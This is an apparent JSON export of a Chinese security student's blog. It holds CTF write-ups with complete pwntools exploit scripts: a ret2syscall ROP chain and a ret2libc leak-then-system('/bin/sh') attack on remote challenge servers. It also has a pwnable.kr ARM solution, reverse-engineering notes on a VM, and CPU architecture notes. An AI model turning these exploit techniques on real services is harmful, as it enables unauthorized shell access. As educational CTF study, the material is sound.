{"meta":{"title":"HANqd's BLOG","subtitle":"一个刚进军安全的小白。","description":null,"author":"HANqd","url":"https://hanqd.github.io","root":"/"},"pages":[{"title":"分类&标签","date":"2019-04-06T12:21:36.000Z","updated":"2019-04-06T12:29:33.860Z","comments":true,"path":"tags/index.html","permalink":"https://hanqd.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"pwn-pwnalpha","slug":"oj pwnalpha","date":"2019-09-03T12:33:26.701Z","updated":"2019-09-04T03:06:43.269Z","comments":true,"path":"2019/09/03/oj pwnalpha/","link":"","permalink":"https://hanqd.github.io/2019/09/03/oj pwnalpha/","excerpt":"pwnalpha题目描述运行pwnalpha","text":"pwnalpha题目描述运行pwnalpha1234567hdd@ubuntu:~/111-oj/blue-whale-oj/pwna$ ./pwnalphaHello brave new challengerAny last words?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaThis will be the last thing that you say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAlas, you had no luck today. 从键盘输入，然后再输出。 题目分析 检查保护机制和文件位数啥的在这里不再赘述，这是做pwn题最基础的命令。 看pwnalpha的反汇编代码12345678__int64 __fastcall sub_400B60(__int64 a1, signed __int64 a2)&#123; char buf; // [rsp+0h] [rbp-400h] sub_410390((signed __int64)\"Any last words?\", a2); sub_4498A0(0, &amp;buf, 0x7D0uLL); return sub_40F710((__int64)\"This will be the last thing that you say: %s\\n\", &amp;buf);&#125; 在ida中点击函数，会出现相应的详细代码，这里点击sub_4498A0，看其源码和汇编代码，发现，是系统调用read函数。12345678mov eax, cs:dword_6BC80Ctest eax, eaxjnz short loc_4498C0xor eax, eaxsyscall ; LINUX - sys_readcmp rax, 0FFFFFFFFFFFFF000hja short loc_449910rep retn 根据分析，知道read函数这里产生了栈溢出，根据read知道，会用到系统调用。这里开启了NX保护，不能直接往栈里写shellcode，可以通过系统调用execave函数来获得shell。即在返回地址处进行系统调用，来执行execave（’/bin/sh’，0，0）命令来获得shell。 其中，根据64位参数的存放顺序(前8个参数分别顺序存放在rdi,rsi,rdx,rcx,r8,r9寄存器中)。 execave的第一个参数（’/bin/sh’）放在rdi中 第二个和第三个参数0需放在rsi,rdx。 系统调用号存放在rax中系统调用号：https://filippo.io/linux-syscall-table/而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。 分别得到pop_rdi，pop_rsi,pop_rdx，pop_rax的地址。使用命令：ROPgadget --binary pwnalpha --only &#39;pop|ret&#39;，找到相应指令地址。具体构造为：ROPgadget_addr + 参数。 得到参数存放地址后，再查找程序中是否有’/bin/sh’参数，然而并没有找到。ROPgadget –binary pwnalpha –string ‘/bin/sh’ 没有/bin/sh，那么怎样把’/bin/sh’传进来呢？可以看到程序中有read函数，是否可以利用read函数来从键盘读入呢？那么读到哪里呢？在gdb中用vmmap命令查看bss段的权限。读到bss段，相当于写，那就是看有写权限的地址段，第三段可以（0x006b6120-0x006bca00范围内都可以）。 123456gdb-peda$ vmmapWarning: not runningStart End Perm Name0x00400400 0x00492519 rx-p /home/hdd/111-oj/blue-whale-oj/pwna/pwnalpha0x00400190 0x004b5ed6 r--p /home/hdd/111-oj/blue-whale-oj/pwna/pwnalpha0x006b6120 0x006bca00 rw-p /home/hdd/111-oj/blue-whale-oj/pwna/pwnalpha 系统调用指令地址：syscall,retROPgadget --binary pwnalpha --only &#39;syscall|ret&#39; 思路因为是栈溢出漏洞，又开了NX保护，所以利用方法是用系统调用execave(‘/bin/sh’,null,null)来获取shell，用rop链来传递参数，然后再进行系统调用execave函数即可。这里的参数’/bin/sh’需要用read函数将’/bin/sh’写入一个可写可执行段.bss段。构造：padding + read(0,bss_addr,len(‘/bin/sh\\x00’)) + sysread_id + syscall_addr +execave(bss_addr,0,0) + sysexecave_id +syscall_addr 利用脚本12345678910111213141516from pwn import *r = remote('vps1.blue-whale.me',19900)pop_rdi = 0x0000000000400686pop_rsi = 0x00000000004101f3pop_rdx = 0x00000000004498b5pop_rax = 0x0000000000415664syscall_addr = 0x0000000000474E65bss_addr = 0x00000000006b6120payload = 'a'*0x400 + 'b'*0x8 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(8) + p64(pop_rax) + p64(0) + p64(syscall_addr)payload += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall_addr)r.send(payload)r.send('/bin/sh\\x00')r.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/categories/pwn/"}],"tags":[{"name":"pwn,ret2syscall","slug":"pwn-ret2syscall","permalink":"https://hanqd.github.io/tags/pwn-ret2syscall/"}]},{"title":"pwn-ROP","slug":"pwn-rop","date":"2019-07-31T03:40:07.075Z","updated":"2019-07-31T03:41:31.567Z","comments":true,"path":"2019/07/31/pwn-rop/","link":"","permalink":"https://hanqd.github.io/2019/07/31/pwn-rop/","excerpt":"pwn-ROP题目描述题目给出了两个有效信息，一个是远程连接的ip及端口号，另一个是libc下载的地址。","text":"pwn-ROP题目描述题目给出了两个有效信息，一个是远程连接的ip及端口号，另一个是libc下载的地址。 题目分析 下载pwn2，查看位数 12hdd@ubuntu:~/111-oj/pwn2$ file pwn2pwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=9517a5e841a7db5fa03c618755241485162e3423, stripped 用ida32打开pwn2，分析程序mian函数：123456int __cdecl main()&#123; sub_80484BB(); sub_80484EA(); return 0;&#125; sub_80484BB()：12345void sub_80484BB()&#123; setbuf(stdin, 0); setbuf(stdout, 0);&#125; sub_80484EA()：1234567ssize_t sub_80484EA()&#123; char buf; // [esp+0h] [ebp-58h] puts(\"welcome to ROP world\"); return read(0, &amp;buf, 0xC8u);&#125; 注意sub_80484EA()中的read函数，读入0xC8个字节到buf，但是分给buf的内存只有58h个字节，显然此处产生栈溢出漏洞。 检查保护机制 1234567hdd@ubuntu:~/111-oj/pwn2$ checksec pwn2[*] '/home/hdd/111-oj/pwn2/pwn2' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 开启NX保护，即栈保护，就不能像第一题那样直接向栈中注入代码来获取shell了，应该想办法绕过这些保护。基础知识：参考Basic ROP 。 查找system函数及/bin/sh字符串 123hdd@ubuntu:~/111-oj/pwn2$ ROPgadget --binary pwn2 --string '/bin/sh'Strings information============================================================ 根据查找结果，发现程序中没有system函数和/bin/sh字符串。 常规ROP做题思路：通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)。 这里选择泄露puts函数的地址，puts函数的地址保存在got表中，而got表由plt表可以查找到，如下图所示： 通过泄露的puts地址，可以查找到相应的libc版本，在libc中各个函数之间的偏移位置不变，可以通过计算出libc的基地址，再计算system和binsh的绝对地址。计算公式：已知puts_addr(上边已经得出)和libc中puts的地址，算出libc的基地址为libcbase=puts_addr-libc.dump(‘puts’)，其中dump函数是一个libcSeacher工具里的一个方法，可以直接找到在libc中其对应函数的地址。libcSeacher下载地址及用法 。system_addr=libcbase+libc.dump(‘system’)binsh_addr=libcbase+libc.dump(‘str_bin_sh’) 脚本代码： 12345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import LibcSearcherelf = ELF('./pwn2')r = remote('pwn1.blue-whale.me',9991)//泄露puts地址puts_plt = elf.plt['puts']puts_got = elf.got['puts']main = 0x08048519paylaod = 'a'*92 + p32(puts_plt) + p32(main) + p32(puts_got)r.recvuntil(\"welcome to ROP world\\n\")r.sendline(paylaod)puts_addr = u32(r.recv()[0:4])print \"puts_addr:\"+hex(puts_addr)//根据已经泄露的puts地址，搜索相对应的libc版本libc=LibcSearcher('puts',puts_addr)#libc.dump(\"system\") #libc.dump(\"str_bin_sh\") #libc.dump(\"__libc_start_main_ret\") #print(libc)//根据libc中的偏移地址得到system和binsh的地址libcbase = puts_addr - libc.dump('puts')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')//构造填充数据，得到shellpayload = 'a'*92 + p32(system_addr) + 'bbbb' + p32(binsh_addr)r.sendline(payload)r.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"pwnable.kr-leg","slug":"pwnable leg","date":"2019-07-22T07:47:43.302Z","updated":"2019-07-22T07:59:53.480Z","comments":true,"path":"2019/07/22/pwnable leg/","link":"","permalink":"https://hanqd.github.io/2019/07/22/pwnable leg/","excerpt":"pwnable.kr-leg涉及知识点：ARM指令 之前接触的都是x86指令，对ARM指令不熟悉，看了链接中的数据处理指令，发现与x86指令集略有不同。","text":"pwnable.kr-leg涉及知识点：ARM指令 之前接触的都是x86指令，对ARM指令不熟悉，看了链接中的数据处理指令，发现与x86指令集略有不同。 题目描述1234567Daddy told me I should study arm.But I prefer to study my leg!Download : http://pwnable.kr/bin/leg.cDownload : http://pwnable.kr/bin/leg.asmssh leg@pwnable.kr -p2222 (pw:guest) 题目中要求下载两个文件，并给出远程登录的端口。 题目分析 下载文件命令：wget+网址 查看leg.c 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm(\"mov r3, pc\\n\");&#125;int key2()&#123; asm( \"push &#123;r6&#125;\\n\" \"add r6, pc, $1\\n\" \"bx r6\\n\" \".code 16\\n\" \"mov r3, pc\\n\" \"add r3, $0x4\\n\" \"push &#123;r3&#125;\\n\" \"pop &#123;pc&#125;\\n\" \".code 32\\n\" \"pop &#123;r6&#125;\\n\" );&#125;int key3()&#123; asm(\"mov r3, lr\\n\");&#125;int main()&#123; int key=0; printf(\"Daddy has very strong arm! : \"); scanf(\"%d\", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf(\"Congratz!\\n\"); int fd = open(\"flag\", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf(\"I have strong leg :P\\n\"); &#125; return 0;&#125; 查看leg.asm，是leg.c的汇编语言形式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push &#123;r4, r11, lr&#125; 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop &#123;r4, r11, pc&#125; 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 由c代码看出满足key1()+key2()+key3()=key，并且输入key值，就可以得到flag。那么题目就变成求key1()、key2()、key3()的值。 得出key1()的值。 123int key1()&#123; asm(\"mov r3, pc\\n\");&#125; 12345678910(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 其中asm()函数是内嵌汇编函数，在c代码中执行汇编指令。 PC代表程序计数器，流水线使用三个阶段，因此指令分为三个阶段执行：.取指（从存储器装载一条指令）；.译码（识别将要被执行的指令）；.执行（处理指令并将结果写回寄存器），pc指向第三条指令。每条指令4字节长，那么pc总是指向当前指令+8。 key1()的返回值为r0，根据汇编指令，r0=r3=pc，pc的值是指向正在取值的指令，而不是正在执行或者译码的指令。当前指令是0x00008cdc &lt;+8&gt;: mov r3, 那么pc即key1()=0x00008ce4。 得出key2()的值 1234567891011121314int key2()&#123; asm( \"push &#123;r6&#125;\\n\" \"add r6, pc, $1\\n\" \"bx r6\\n\" \".code 16\\n\" \"mov r3, pc\\n\" \"add r3, $0x4\\n\" \"push &#123;r3&#125;\\n\" \"pop &#123;pc&#125;\\n\" \".code 32\\n\" \"pop &#123;r6&#125;\\n\" );&#125; 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. key2()返回值为r3，r3=pc，又r3=r3+4，所以r3=pc+4=0x00008d08+4=0x00008d0ckey2()=0x00008d0c。 得出key3()的值 123int key3()&#123; asm(\"mov r3, lr\\n\");&#125; 12345678910(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. 主函数中的汇编指令：调用完key3()函数后返回到主函数。120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 由汇编指令得出key3()的返回值r0=r3=lr，lr保存的是子函数返回位置的地址，在主函数中看到lr=0x00008d80，所以key3()=0x00008d80。 计算key值。计算脚本：12345key1=0x00008ce4key2=0x00008d0ckey3=0x00008d80key=key1+key2+key3print key 得出结果：12hdd@ubuntu:~/111-oj/pwnable.kr-leg$ python leg.py108400 运行程序 1234/ $ ./legDaddy has very strong arm! : 108400Congratz!My daddy has a lot of ARMv5te muscle!","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://hanqd.github.io/tags/pwn/"}]},{"title":"304challenge-1","slug":"304(1)","date":"2019-07-20T12:06:02.177Z","updated":"2019-07-20T12:06:52.871Z","comments":true,"path":"2019/07/20/304(1)/","link":"","permalink":"https://hanqd.github.io/2019/07/20/304(1)/","excerpt":"这道测试拖了很久了，之前也看过，一看是反汇编的知识，自己对于反汇编又不是很熟悉加上有很多杂事，没有集中的时间来做，就拖了又拖，现在可以来仔细看看题目了。","text":"这道测试拖了很久了，之前也看过，一看是反汇编的知识，自己对于反汇编又不是很熟悉加上有很多杂事，没有集中的时间来做，就拖了又拖，现在可以来仔细看看题目了。 题目描述题目给了三个任务： 对myvm进行分析，理解其指令格式，取址方式，了解指令用法； 基于对myvm的理解写出对应的反汇编器； 对hello程序进程分析，理解hello程序所做的所有事情。 我对题目的理解是：先分析myvm程序，得出需要的汇编语言指令集，有了指令集再编写反汇编器（反汇编器是把机器代码或二进制代码转换为汇编语言的程序），最后用这个反汇编器对hello程序进行反汇编，得到hello程序的汇编语言形式。 反汇编器最主要的是二进制指令集到汇编指令集的映射。 接下来先对myvm程序进行分析，得出反汇编器所需的指令集。 mymv程序分析 myvm的主函数 1234567891011121314151617181920212223242526272829__int64 __usercall main@&lt;rax&gt;(char **a1@&lt;rsi&gt;, char **a2@&lt;rdx&gt;, __int64 a3@&lt;rax&gt;, int a4@&lt;edi&gt;)&#123; __int64 v4; // rbx int v5; // eax if ( a4 == 2 ) &#123; signal(2, handler); v4 = sub_CE0(a1[1], handler); unk_202014 = 1; while ( 1 ) &#123; v5 = sub_E90(v4); if ( v5 ) break; if ( !unk_202014 ) goto LABEL_8; &#125; if ( v5 == 2 ) puts(\"Illegal Instruction\");LABEL_8: nullsub_1(v4); &#125; else &#123; fprintf(stderr, \"Usage: %s &lt;myvm program&gt;\\n\", *a1, a3); &#125; return 0LL;&#125; 从代码中可以得到主函数调用了signal、sub_CE0、sub_E90、nullsub_1函数，有while循环，有if条件语句。 signal()函数：https://www.cnblogs.com/wuyepeng/p/9790396.html ，signal(2, handler)属于第三种情况，自定义一个信号处理函数handler，要求内核在处理该信号时切换到用户态执行这个处理函数。当程序是一个死循环（while（1））时，按Ctrl+c可以终止程序。 调用sub_CE0()函数 12345678910111213141516171819202122232425262728293031char *__fastcall sub_CE0(const char *a1)&#123; FILE *v1; // rax FILE *v2; // rbx __int64 v3; // r15 void *v4; // r14 char *v5; // rbx v1 = fopen(a1, \"rb\"); v2 = v1; if ( !v1 ) return 0LL; fseek(v1, 0LL, 2); v3 = ftell(v2); fseek(v2, 0LL, 0); v4 = malloc(0x10000uLL); memset(v4, 0, 0x10000uLL); fread(v4, 1uLL, v3, v2); fclose(v2); _mm_storeu_si128( (__m128i *)&amp;unk_202018 + 4096, _mm_unpacklo_epi64((__m128i)(unsigned __int64)&amp;unk_202018, (__m128i)((unsigned __int64)&amp;unk_202018 + 0x8000))); memcpy(&amp;unk_202018, v4, 0x10000uLL); _mm_storeu_si128((__m128i *)&amp;unk_202018 + 4097, (__m128i)0LL); *(_QWORD *)((char *)&amp;unk_202018 + 65566) = 0LL; *((_WORD *)&amp;unk_202018 + 32785) = 32764; *((_QWORD *)&amp;unk_202018 + 8197) = 0LL; v5 = (char *)&amp;unk_202018 + 0x10000; free(v4); return v5;&#125; （1）程序中的FILE数据类型，FILE是C语言文件结构定义，打开文件和文件操作要用到这类结构。可以看成变量类型，用于变量声明。这个是一种数据结构类型，用来表示一个文件的相关信息，如果定义了一个文件指针，就用这个指针来指向某个文件，然后就能使用这个指针对文件来进行操作了。也就是说可以用v1和v2对文件进行操作。 （2）调用fopen（）函数是打开一个文件的函数，其中有两个参数，第一个是要打开文件的文件名，第二个是对其文件进行哪种操作。程序中是打开a1文件，对其进行rb操作，”rb”：打开一个二进制文件，文件必须存在，只允许读。 （3）调用fseek()函数，int fseek(FILE *stream, long offset, int fromwhere),函数设置文件指针stream的位置。如果执行成功，stream将指向以fromwhere（偏移起始位置：文件头0(SEEK_SET)，当前位置1(SEEK_CUR)，文件尾2(SEEK_END)）为基准，偏移offset（指针偏移量）个字节的位置。如果执行失败(比如offset超过文件自身大小)，则不改变stream指向的位置。这里 fseek(v1, 0LL, 2)，指针v1指向文件的文件尾，fseek(v2, 0LL, 0)指针v2指向文件的文件头。 （4）调用ftell（）函数，用于得到文件位置指针当前位置相对于文件首的偏移字节数。v3 = ftell(v2)，把文件位置指针v2当前位置相对于文件首的偏移字节数赋值给v3。 （5）调用malloc（）函数，动态分配内存，其函数原型为void *malloc(unsigned int size)；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。如果分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当内存不再使用时，应使用free()函数将内存块释放。这里分配了一块长度为0x10000uLL的连续内存区域，且v4指向该区域的开头位置。 （6）调用memset()函数，对分配的以v4开头的长度为0x10000uLL的连续内存区域进行初始化，初始化为0. （7）调用fread()函数，它从文件流中读数据，函数原型为：size_t fread ( void buffer, size_t size, size_t count, FILE stream) ;buffer用于接收数据的内存地址，从给定流 stream 读取数据，最多读取count个项，每个项size个字节，如果调用成功返回实际读取到的项个数（小于或等于count），如果不成功或读到文件末尾返回 0。fread(v4, 1uLL, v3, v2)从v2文件流中读取数据，最多读取v3个项，每个项1ull个字节，读取的数据存在以v4开始的内存中。 这里以上的代码意思是：打开a1文件，只读，用v1指向a1文件，把v1赋值给v2，v2也指向a1文件，如果返回指针v1为空，则不能打开该文件。接下来v1指向文件尾，v3暂存v2的位置（即a1文件所在位置），v2指向文件头，分配以v4开始的长度为0x10000uLL的内存空间，并初始化为0，读取v2指向的文件流。关闭文件v2。 （8）调用_mm_storeu_si128（）函数，功能是可以存储128位的数据。将逗号后的__m128i 变量的值存储到&amp;unk_202018 + 4096所指定的变量中去。 （9）调用 _mm_unpacklo_epi64（）函数，返回一个_m128i的寄存器。 （10）调用memcpy（）函数，void memcpy(void destin, void *source, unsigned n);从源source所指的内存地址的起始位置开始拷贝n个字节到目标destin所指的内存地址的起始位置中。memcpy(&amp;unk_202018, v4, 0x10000uLL)从v4所指的内存地址的起始位置开始拷贝0x10000uLL个字节到目标&amp;unk_202018所指的内存地址的起始位置中。 （11）_QWORD是一种无符号整数类型。","categories":[],"tags":[{"name":"304challenge","slug":"304challenge","permalink":"https://hanqd.github.io/tags/304challenge/"}]},{"title":"《软件安全分析与应用》基础知识","slug":"软件安全分析与应用2","date":"2019-07-01T11:57:00.359Z","updated":"2019-07-21T09:12:58.791Z","comments":true,"path":"2019/07/01/软件安全分析与应用2/","link":"","permalink":"https://hanqd.github.io/2019/07/01/软件安全分析与应用2/","excerpt":"从事恶意代码分析、软件漏洞分析的工作需要掌握计算机专业方面的诸多基础知识，这些知识包括但不限于硬件基础知识、反汇编及对抗技术以及操作系统基础。","text":"从事恶意代码分析、软件漏洞分析的工作需要掌握计算机专业方面的诸多基础知识，这些知识包括但不限于硬件基础知识、反汇编及对抗技术以及操作系统基础。 处理器硬件架构基础CPU结构 CPU是计算机中央处理器的简称，控制着计算机的操作和执行数据处理功能，其结构包括寄存器、算术逻辑单元（ALU）、控制器和内部总线。 CPU的4部分组成中，寄存器记录了操作系统关键数据结构的入口，这些信息是软件漏洞与恶意代码分析的基础信息，则这里重点关注CPU结构中的寄存器结构。 IA-32的CPU寄存器包括指令指针寄存器、通用数据寄存器、地址指针寄存器、变址指针寄存器、标志位寄存器、段寄存器和控制寄存器等。 指令指针寄存器：EIP寄存器，存储了当前执行指令的地址。 通用数据寄存器：EAX、EBX、ECX、EDX，通常用于存储参与运算的数据及运算结果。其中ECX常被用于存储循环处理指令的循环次数，EAX和EDX常作为乘除法指令的隐含操作数。 地址指针寄存器：ESP、EBP。ESP记录了当前的栈顶，EBP记录的是当前函数的栈底。 变址指针寄存器：ESI、EDI，通常ESI是操作数源地址，EDI是操作数目的地址。 标志位寄存器：统称为EFLAGS。 标志位 含义 CF 进为标志 PF 奇偶标志 AF 辅助进位标志 ZF 零标志 SF 符号标志 TF 跟踪标志 IF 中断允许标志 DF 方向标志 OF 溢出标志 IOPL I/O特权标志 NT 嵌套任务标志 RF 恢复标志 VM 虚拟8086模式标志 AC 对齐检测标志 VIF 虚拟中断标志 VIP 虚拟中断等待标志 ID 识别标志 段寄存器：包括代码段寄存器CS、数据段寄存器DS、堆栈段寄存器SS、附加段寄存器ES、FS、GS。实模式下段寄存器通常与指针寄存器如ESP、EDI、ESI等联合使用，保护模式下需要与描述符表结合。 控制寄存器：包括CR0、CR1、CR2、CR3、CR4，用于记录处理器的运行模式和当前执行任务的属性。 控制寄存器 功能作用 CR0 记录系统控制标志，这些标志控制处理器的运行模式和状态。例如PE是保护模式标志，置1启用保护模式，置0启用实地址模式。 CR1 保留的控制寄存器，用于将来的扩展 CR2 记录引起页故障的线性地址 CR3 页表寄存器，存储了20位的页目录表的基地址和两个标志位PCD、PWT CR4 包含一组标志，用于决定是否启用IA-32架构上的几个扩展。例如VME为虚拟8086模式扩展，置1表示在虚拟8086模式下启用中断和异常处理扩展，置0则关闭 保护模式IA-32架构的CPU具有两种工作模式：实模式和保护模式，工作模式受到CR0控制寄存器的PE标志位控制。实模式和保护模式：CPU刚开始初始化后工作在实模式下，PE标志位值为0，仅使用20位地址，寻址空间为1MB。当操作系统启动时，将CPU的PE标志位置1，开启保护模式，使用32位地址，内存寻址空间扩展到4GB。实模式不支持多线程，不能实现权限分级；保护模式下引入内存的分页和分段管理机制，实现了内存分页和权限分级，并支持多线程，多任务。分页由CR3寄存器支持，分段由内存管理寄存器（包括GDTR全局描述符表寄存器、IDTR中断描述符表寄存器、LDTR局部描述符表寄存器、TR任务寄存器）4个寄存器支持。 特权级CPU支持Ring0、Ring1、Ring2、Ring3共4个权限级别，Ring0权限最高，Ring3权限最低，Windows操作系统只使用了Ring0和Ring3两个级别，其中，Ring0级可以访问Ring0和Ring3的资源，Ring3级无法访问Ring0级的资源，只能访问Ring3级的资源。为了进行代码段和数据段间的特权级检验，需要3种类型的特权级支持：当前特权级CPL、描述符特权级DPL、请求特权级RPL。 中断处理与异常处理 